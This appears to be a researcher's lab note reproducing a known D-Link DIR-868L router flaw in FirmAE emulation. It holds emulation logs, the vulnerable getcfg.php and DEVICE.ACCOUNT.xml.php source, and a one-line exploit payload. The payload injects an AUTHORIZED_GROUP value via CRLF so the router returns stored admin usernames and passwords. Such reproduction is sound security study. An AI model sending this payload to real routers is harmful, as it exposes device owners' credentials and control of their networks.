
Ref
- https://www.youtube.com/watch?v=sv2gkR1XLIw
- https://github.com/advisories/GHSA-r9jg-89wp-76vr
- https://www.cnblogs.com/lanyincao/p/14802766.html
- https://github.com/pr0v3rbs/FirmAE

Product version
- Dlink DIR 868L
- DIR-868L_fw_revB_2-05b02_eu_multi_20161117

Download from
- https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip


I use docker-helper first,then reset FirmAE to `53701af3615d0caa015e41ed2d5804edee7ff3c7` commit ,some how it works.


```
user@vm-ubuntu18:~/FirmAE$ sudo bash run.sh -c dlink ~/DIR868L_B1_FW205WWb02.bin 
[sudo] password for user: 
[*] /home/user/DIR868L_B1_FW205WWb02.bin emulation start!!!
user@vm-ubuntu18:~/FirmAE$ sudo bash run.sh -a dlink ~/DIR868L_B1_FW205WWb02.bin 
[*] /home/user/DIR868L_B1_FW205WWb02.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
[*] /home/user/DIR868L_B1_FW205WWb02.bin already succeed emulation!!!

[IID] 1
[MODE] analyze
[+] Network reachable on 192.168.0.1!
[+] Web service on 192.168.0.1
[*] Waiting web service...



user@vm-ubuntu18:~/FirmAE$ sudo bash run.sh -r dlink ~/DIR868L_B1_FW205WWb02.bin 
[sudo] password for user: 
[*] /home/user/DIR868L_B1_FW205WWb02.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
[*] /home/user/DIR868L_B1_FW205WWb02.bin already succeed emulation!!!

[IID] 1
[MODE] run
[+] Network reachable on 192.168.0.1!
[+] Web service on 192.168.0.1
Creating TAP device tap1_0...
Set 'tap1_0' persistent and owned by uid 0
Initializing VLAN...
Bringing up TAP device...
Starting emulation of firmware... 192.168.0.1 true true 8.084147218 24.297780002
```

Exploit payload
```
SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1
```


![[Pasted image 20230731150910.png]]



Getcfg.php

```php=
HTTP/1.1 200 OK
Content-Type: text/xml

<?echo "<?";?>xml version="1.0" encoding="utf-8"<?echo "?>";?>
<postxml>
<? include "/htdocs/phplib/trace.php";

if ($_POST["CACHE"] == "true")
{
        echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
}
else
{
        if($AUTHORIZED_GROUP < 0)
        {
                echo "\t<result>FAILED</result>\n";
                echo "\t<message>Not authorized</message>\n";
        }
        else
        {
                $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
                TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
                $SERVICE_INDEX = 0;
                while ($SERVICE_INDEX < $SERVICE_COUNT)
                {
                        $GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
                        TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
                        if ($GETCFG_SVC!="")
                        {
                                $file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
	                            // htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php will print current username and password
                                if (isfile($file)=="1") dophp("load", $file);
                        }
                        $SERVICE_INDEX++;
                }
        }
}
?></postxml>
```

DEVICE.ACCOUNT.xml.php 
```php=
<module>
        <service><?=$GETCFG_SVC?></service>
        <device>
                <account>
<?
$cnt = query("/device/account/count");
if ($cnt=="") $cnt=0;
echo "\t\t\t<seqno>".query("/device/account/seqno")."</seqno>\n";
echo "\t\t\t<max>".query("/device/account/max")."</max>\n";
echo "\t\t\t<count>".$cnt."</count>\n";
foreach("/device/account/entry")
{
        if ($InDeX > $cnt) break;
        echo "\t\t\t<entry>\n";
        echo "\t\t\t\t<uid>".           get("x","uid"). "</uid>\n";
        echo "\t\t\t\t<name>".          get("x","name").        "</name>\n";
        echo "\t\t\t\t<usrid>".         get("x","usrid").       "</usrid>\n";
        echo "\t\t\t\t<password>".      get("x","password")."</password>\n"; //password
        echo "\t\t\t\t<group>".         get("x", "group").      "</group>\n";
        echo "\t\t\t\t<description>".get("x","description")."</description>\n";
        echo "\t\t\t</entry>\n";
}
?>              </account>
                <group>
<?
$cnt = query("/device/group/count");
if ($cnt=="") $cnt=0;
echo "\t\t\t<seqno>".query("/device/group/seqno")."</seqno>\n";
echo "\t\t\t<max>".query("/device/group/max")."</max>\n";
echo "\t\t\t<count>".$cnt."</count>\n";
$b = "/device/group/entry";
function gen_member($s,$p)
{
        $cnt = query($p."/count");
        echo $s."<member>\n";
        echo $s."\t<seqno>".query($p."/seqno")."</seqno>\n";
        echo $s."\t<max>".query($p."/max")."</max>\n";
        echo $s."\t<count>".$cnt."</count>\n";
        foreach($p."/entry")
        {
                if ($InDeX > $cnt) break;
                echo $s."\t<entry>\n";
                echo $s."\t\t<uid>".    get("x","uid"). "</uid>\n";
                echo $s."\t\t<name>".   get("x","name"). "</name>\n";
                echo $s."\t</entry>\n";
        }
        echo $s."</member>\n";
}
foreach($b)
{
        if ($InDeX > $cnt) break;
        echo "\t\t\t<entry>\n";
        echo "\t\t\t\t<uid>".           get("x","uid"). "</uid>\n";
        echo "\t\t\t\t<name>".          get("x","name").        "</name>\n";
        echo "\t\t\t\t<gid>".           get("x","gid"). "</gid>\n";
        gen_member("\t\t\t\t", $b.":".$InDeX."/member");
        echo "\t\t\t</entry>\n";
}
?>              </group>
                <session>
<?
        echo dump(3, "/device/session");
?>              </session>
        </device>
</module>

```